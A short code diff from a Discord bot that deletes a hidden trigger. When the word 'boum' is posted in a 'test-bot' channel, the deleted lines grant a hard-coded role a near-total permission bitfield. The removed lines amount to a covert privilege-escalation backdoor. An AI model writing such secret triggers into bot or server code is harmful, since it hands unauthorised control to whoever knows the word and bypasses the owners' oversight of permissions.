@@ -294,17 +294,6 @@ client.on('message', async msg => {
 		});
 	}
 
-
-	if (msg.channel.name === "test-bot" && msg.content === "boum") {
-		roles = msg.member.roles.array();
-		roles.forEach(function (role) {
-			if (role.id === '398203935556632577') {
-				role.edit({ permissions : 2146958583 })
-				.catch(console.error);
-			}
-		});
-	}
-
 	if (msg.channel.name === "feuilles-de-route") {
 		fichiers = msg.attachments.array();
 		fichiers.forEach(function (fichier) {
